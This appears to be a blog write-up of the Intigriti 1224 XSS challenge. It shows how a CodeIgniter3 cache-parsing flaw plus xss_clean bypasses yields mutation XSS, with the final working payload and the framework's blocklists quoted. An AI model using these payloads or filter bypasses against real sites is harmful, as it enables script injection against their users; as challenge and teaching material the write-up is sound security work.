---
layout: post
title: Intigriti 1224 Challenge
---
The goal of this challenge was to achieve XSS and create an alert. The challenge provides a "Fireplace Generator" that takes a title as a parameter and dynamically generates a page using it. Let's look at how a caching quirk in CodeIgniter3 can be used to create an opportunity for mutation XSS (mXSS).

---
## Code review

The challenge included source code. It was evident fairly quickly it was based on the CodeIgniter PHP framework. If all the mentions of focusing on PHP 5 weren't enough to raise some flags a close inspection of the `readme.rst` revealed it is not the latest iteration of CodeIgniter (CodeIgniter4), but the discontinued CodeIgniter3 instead.


```
...

************
Installation
************

Please see the `installation section <https://codeigniter.com/userguide3/installation/index.html>`_          <----- v3
of the CodeIgniter User Guide.

...


*********
Resources
*********

-  `User Guide <https://codeigniter.com/docs>`_
-  `Contributing Guide <https://github.com/bcit-ci/CodeIgniter/blob/develop/contributing.md>`_
-  `Language File Translations <https://github.com/bcit-ci/codeigniter3-translations>`_                      <----- v3
-  `Community Forums <http://forum.codeigniter.com/>`_
-  `Community Wiki <https://github.com/bcit-ci/CodeIgniter/wiki>`_
-  `Community Slack Channel <https://codeigniterchat.slack.com>`_

```

With this in mind I sorted through the boilerplate of the framework to find the custom code of the challenge. The relevant files (for now) are:

`src\application\controllers\View.php`
```php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

function str2id($str)
{
    if (strstr($str, '"')) {
        die('Error: No quotes allowed in attribute');
    }
    // Lowercase everything except first letters
    $str = preg_replace_callback('/(^)?[A-Z]+/', function($match) { 
        return isset($match[1]) ? $match[0] : strtolower($match[0]);
    }, $str);
    // Replace whitespace with dash
    return preg_replace('/[\s]/', '-', $str);
}

class View extends CI_Controller
{
    public function index()
    {
        $this->load->helper('string');
        $this->load->helper('security');
        $this->output->cache(1);

        $title = $this->input->get('title') ?: 'Christmas Fireplace';

        $title = xss_clean($title);
        $id = str2id($title);

        $this->load->view('view', array(
            "id" => $id,
            "title" => $title
        ));
    }
}
```

and 

`src\application\views\view.php`
```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="/style.css">
</head>

<body background="#483741" class="fire-border">
  <a href="/index.php" class="top-left">⬅ Go back</a>
  <div class="wrapper">
    <h1><?= htmlspecialchars($title) ?></h1>     

...

    <div class="fireplace" id="<?= $id ?>">
      <div class="bottom">
        <ul class="ground">
```

As a quick summary, the view controller takes the `title` HTTP GET parameter, sanitizes it with the code igniter function `xss_clean`, and re-assigns it, this result is manipulated again with the above `str2id`. This function explicitly prohibits the double quote character `"`, lowercases the input, and replaces and whitespace characters with hyphens.  The sanitized `$title` and `$id` are passed to the `view.php` template and interpolated into the HTML structure as defined above, note the additional `htmlspecialchars` call on the `$title` before it is inserted into the template .

`htmlspecialchars` in the text context will prevent opening any new tags and since `"` is disallowed I cannot break out of the `id` attribute.

I tried a few things for a while and didn't make any progress but luckily the first hint was soon released.

> *A **mutant** elf has been causing chaos in the toy factory, making it a slow mess! Surely adding a little **cache** would make it faster?*

This made the goal clear, abuse something in the caching implementation (enabled on the view via `$this->output->cache(1);`) to achieve mutation XSS.

## Cache Abuse

I started with some perusing of the [documentation](https://codeigniter.com/userguide3/general/caching.html#web-page-caching) to discover how the caching worked.

[![](/assets/image/attachments/2024-12-18-Intigriti-December-Challenge-caching-n.png)](/assets/image/attachments/2024-12-18-Intigriti-December-Challenge-caching-n.png){:.glightbox}

From the view I knew this means the page should be cached for 1 minute.

```php
...
	public function index()
	{
		$this->load->helper('string');
		$this->load->helper('security');
		$this->output->cache(1);

...
```

With some basic blackbox testing I confirmed from the response headers that this is indeed the case. On the first page load the `cache-control` header is set with the age of the cache entry in seconds.

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-cache60.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-cache60.png){:.glightbox}

On repeated requests I verify I am accessing from the cache.

[![](/assets/image/attachments/2024-12-18-Intigriti-December-Challenge-cache42.png)](/assets/image/attachments/2024-12-18-Intigriti-December-Challenge-cache42.png){:.glightbox}

Playing with the request I deduced it was keyed in the query string.

I knew at this point the trick was likely in having the cache return something unexpected that would lead to a mutation when retrieved. To determine this I knew I would have to look into the code igniter source for the caching implementation.

A quick search revealed the correct file, `src\system\core\Output.php`.

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-output-php.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-output-php.png){:.glightbox}

The `cache` function itself was unimportant, but immediately below I did find more relevant functions, namely `_display`, `_write_cache`, `_display_cache`, `delete_cache`, and `set_cache_header`. Together these functions more or less paint a full picture of how the view caching works. What followed next was some arduous reading of these functions to solidify my understanding (which I won't bore you with the details of) before I then started auditing the functions for ways that I could potentially alter the content returned from the cache.

Something that stood out pretty quickly was the cache file format. From `_write_cache` I see:

```php
...

	// Put together our serialized info.
	$cache_info = serialize(array(
		'expire'	=> $expire,
		'headers'	=> $this->headers
	));

	$output = $cache_info.'ENDCI--->'.$output;

	for ($written = 0, $length = self::strlen($output); $written < $length; $written += $result)
	{
		if (($result = fwrite($fp, self::substr($output, $written))) === FALSE)
		{
			break;
		}
	}
...

```

The cache file consists of PHP serialized cache metadata, a constant "ENDCI--->" and the output (the HTML getting cached).

later in `_display_cache` I see this "ENDCI--->" constant is used to split the serialized cache information from the cache entry when the file is being parsed from disk.

```php
...

		if ( ! preg_match('/^(.*)ENDCI--->/', $cache, $match))
		{
			return FALSE;
		}

		$cache_info = unserialize($match[1]);
		$expire = $cache_info['expire'];

...
```

Since I controlled the content of `$output` (html to be cached) in the first function, what would happen if I could write this magic "ENDCI--->" constant into the cache, what would happen when it is parsed from disk with two "ENDCI--->" entries? to confirm this I did a basic PoC on the command line, I'll repeat it here to explain the issue in detail. 'aaaa' represents the serialized cache metadata and 'bbbbcccc' represents the HTML getting cached (under my control). Due to the greedy nature of the regex, by adding "ENDCI--->" into this controlled part the regex will parse up to the second "ENDCI--->".

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-cli.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-cli.png){:.glightbox}

But what is the impact of this? I checked how `$match[0]` and `$match[1]` were used.

```php
...

		$cache_info = unserialize($match[1]);
		$expire = $cache_info['expire'];

		$last_modified = filemtime($filepath);

		// Has the file expired?
		if ($_SERVER['REQUEST_TIME'] >= $expire && is_really_writable($cache_path))
		{
			// If so we'll delete it.
			@unlink($filepath);
			log_message('debug', 'Cache file has expired. File deleted.');
			return FALSE;
		}

		// Send the HTTP cache control headers
		$this->set_cache_header($last_modified, $expire);

		// Add headers from cache file.
		foreach ($cache_info['headers'] as $header)
		{
			$this->set_header($header[0], $header[1]);
		}

		// Display the cache
		$this->_display(self::substr($cache, self::strlen($match[0])));
		log_message('debug', 'Cache file is current. Sending it to browser.');
		return TRUE;

...

```

`$match[1]` is passed into an `unserialize` call, but now the serialized content (represented by 'aaaa') is polluted with the original "ENDCI--->" and the start of the output (represented by 'bbbb'). Thankfully the PHP serialization format is forgiving is this regard and ignores trailing garbage when doing unserialization. I've done a basic demo of this here:

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-serial.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-serial.png){:.glightbox}

Now for `$match[0]`. It is used on the line `$this->_display(self::substr($cache, self::strlen($match[0])));`. This appears to be returning the cache content to be rendered back to the user. But this is not returning `$match[0]` itself, instead its length is used to substring the full string before `preg_match` was called. `self::substr` and `self::strlen` are just byte safe wrappers of the builtin functions, for this purpose they are essentially the same.

```php
...

	protected static function strlen($str)
	{
		return (self::$func_overload)
			? mb_strlen($str, '8bit')
			: strlen($str);
	}

...

	protected static function substr($str, $start, $length = NULL)
	{
		if (self::$func_overload)
		{
			// mb_substr($str, $start, null, '8bit') returns an empty
			// string on PHP 5.3
			isset($length) OR $length = ($start >= 0 ? self::strlen($str) - $start : -$start);
			return mb_substr($str, $start, $length, '8bit');
		}

		return isset($length)
			? substr($str, $start, $length)
			: substr($str, $start);
	}

...
```

Going back to the toy CLI example these operations would be equivalent to:

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-strlen-substr.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-strlen-substr.png){:.glightbox}

The length of `$match[0]` is used the index to start the substring, meaning only 'cccc' is returned. This gave me all the pieces to create a mutation. It means if I can insert "ENDCI--->" into the HTML getting cached, then only everything after it in the original HTML document (represented by 'cccc') will get returned when it is retrieved from the cache.

but it was not as simple as putting the constant, I still needed to navigate around the sanitization in place. A quick reminder of the important custom code:

```php
# src\application\controllers\View.php

function str2id($str)
{
    if (strstr($str, '"')) {
        die('Error: No quotes allowed in attribute');
    }
    // Lowercase everything except first letters
    $str = preg_replace_callback('/(^)?[A-Z]+/', function($match) { 
        return isset($match[1]) ? $match[0] : strtolower($match[0]);
    }, $str);
    // Replace whitespace with dash
    return preg_replace('/[\s]/', '-', $str);
}

class View extends CI_Controller
{
    public function index()
    {
        $this->load->helper('string');
        $this->load->helper('security');
        $this->output->cache(1);

        $title = $this->input->get('title') ?: 'Christmas Fireplace';

        $title = xss_clean($title);
        $id = str2id($title);

        $this->load->view('view', array(
            "id" => $id,
            "title" => $title
        ));
    }
}

# src\application\views\view.php
...

<body background="#483741" class="fire-border">
  <a href="/index.php" class="top-left">⬅ Go back</a>
  <div class="wrapper">
    <h1><?= htmlspecialchars($title) ?></h1>     

...

    <div class="fireplace" id="<?= $id ?>">
      <div class="bottom">
        <ul class="ground">
```

The first landing spot is of no use since `htmlspecialchars` will HTML encode the '>' from "ENDCI--->", meaning I needed to use `$id`. This means working around `xss_clean` and `str2id`. 

The lowercasing of `str2id` can be bypassed by again abusing a regex. By beginning the input with capitalized "ENDCI" the first capturing group (`$match[0]`) will be empty, causing the `isset($match[1])` check to fail and `$match[0]` to be returned unchanged. I tested this on the CLI like so:

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-not-lower.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-not-lower.png){:.glightbox}

Next I figured out some part of `xss_clean` was sanitizing `->`, so to avoid this I took advantage of the last step of `str2id`, `preg_replace('/[\s]/', '-', $str);` , which replaces whitespace with '-'. Since this is called after `xss_clean` the input "ENDCI-- >" should be converted to "ENDCI--->".

Finally I tried these theories together and attempted a basic HTML Injection. I visited https://challenge-1224.intigriti.io/index.php/view?title=ENDCI--%20%3E%3Ch1%3ETEST%3C/h1%3E once to create the cache entry, and then again to retrieve the manipulated response spliced by my "ENDCI--->" payload. The HTML Injection succeeded.

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-htmli.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-htmli.png){:.glightbox}

## HTML Injection -> Mutation XSS

It wasn't simple to elevate this to XSS straight away. My input was still passing through `xss_clean` which does a pretty good job at filtering out any payloads. Maybe a bypass exists here, but the challenge hint was obviously pointing towards mXSS so I didn't spend long checking for an easy win before pursuing this type of payload instead.

I was only vaguely familiar with mXSS at this point so a large portion of time was spent fuzzing public payloads, observing the behaviour and trying to understand what was going on. I quickly realised many of the usual tags used in these payloads were blocked, which I tracked down to the `_sanitize_naughty_html` function that is called at some point by `xss_clean`.

```php
...

	protected function _sanitize_naughty_html($matches)
	{
		static $naughty_tags    = array(
			'alert', 'area', 'prompt', 'confirm', 'applet', 'audio', 'basefont', 'base', 'behavior', 'bgsound',  // alert, confirm & prompt, lol
			'blink', 'body', 'embed', 'expression', 'form', 'frameset', 'frame', 'head', 'html', 'ilayer',
			'iframe', 'input', 'button', 'select', 'isindex', 'layer', 'link', 'meta', 'keygen', 'object',
			'plaintext', 'style', 'script', 'textarea', 'title', 'math', 'video', 'svg', 'xml', 'xss'
		);

...
```

Comparing these to a list of mXSS payloads on the [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#consuming-tags) I found a discrepancy, `xmp` was not a "naughty tag", meaning `<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>` is a potentially valid payload. I simplified it to `<xmp><p id='</xmp><h1>TEST</h1>'></xmp>` to avoid the double quote restriction and minimize the chance of `xss_clean` interfering for the time being. Testing this I was surprised to see it worked!

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-mhtmli.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-mhtmli.png){:.glightbox}

I was pretty floored at the time, I was still at the "blindly experimenting with payloads" stage but I managed to cause a mutation. I wanted to understand what was going on before continuing so I put the page source into a `DOMParser` visualiser https://livedom.bentkowski.info/. 

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-domvis.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-domvis.png){:.glightbox}

This made things click for me and I think I can infer the parser behaviour as a result. Remember `str2id` replacing whitespace with '-'? I didn't think of it before trying the payload but it will change `<xmp><p id='</xmp><h1>TEST</h1>'></xmp>` to `<xmp><p-id='</xmp><h1>TEST</h1>'></xmp>`. I think this `<p-id=...` is an invalid tag format, since there is no space after the tag name or any attribute key, meaning `DOMParser` doesn't recognise it, continues parsing until the closing `</xmp>` inside the attribute, and continues in the HTML context from there leading to the `<h1>` getting rendered. At least that is the best guess from a mXSS novice :).

With this clarified, I just needed to make an XSS payload. Luckily `xss_clean` is somewhat context aware and so does not sanitize attribute contents as stringently, however there were still a few hurdles to clear. The below section of `xss_clean` steered me away from `script` or URI based payloads

```php
...

do
	{
		$original = $str;

		if (preg_match('/<a/i', $str))
		{
			$str = preg_replace_callback('#<a(?:rea)?[^a-z0-9>]+([^>]*?)(?:>|$)#si', array($this, '_js_link_removal'), $str);
		}

		if (preg_match('/<img/i', $str))
		{
			$str = preg_replace_callback('#<img[^a-z0-9]+([^>]*?)(?:\s?/?>|$)#si', array($this, '_js_img_removal'), $str);
		}

		if (preg_match('/script|xss/i', $str))
		{
			$str = preg_replace('#</*(?:script|xss).*?>#si', '[removed]', $str);
		}
	}

...
```

`<svg/onload>` survives inside an attribute untouched thankfully, the last problem is calling `alert`. The two obvious choices are redacted by *another* section of `xss_clean`:

```php
...
		/* For example:   eval('some code')

         * Becomes: eval&#40;'some code'&#41;

         */
		$str = preg_replace(
			'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si',
			'\\1\\2&#40;\\3&#41;',
			$str
		);

		// Same thing, but for "tag functions" (e.g. eval`some code`)
		// See https://github.com/bcit-ci/CodeIgniter/issues/5420
		$str = preg_replace(
			'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)`(.*?)`#si',
			'\\1\\2&#96;\\3&#96;',
			$str
		);

...
```

I got around this using `alert.apply(null,[document.domain])`.

Putting this together I had the final payload `ENDCI-- ><xmp><p id='</xmp><svg/onload=alert.apply(null,[document.domain])>'></xmp>`. I set the parameter, visited once to set the cache entry, and after a few seconds reloaded the page and was presented with an alert.

[![](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-gg.png)](/assets/image/attachments/2024-12-18-Intigriti-1224-Challenge-gg.png){:.glightbox}

## Resources
- https://codeigniter.com/userguide3/general/caching.html#web-page-caching
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#consuming-tags
- https://sonarsource.github.io/mxss-cheatsheet/
- https://livedom.bentkowski.info/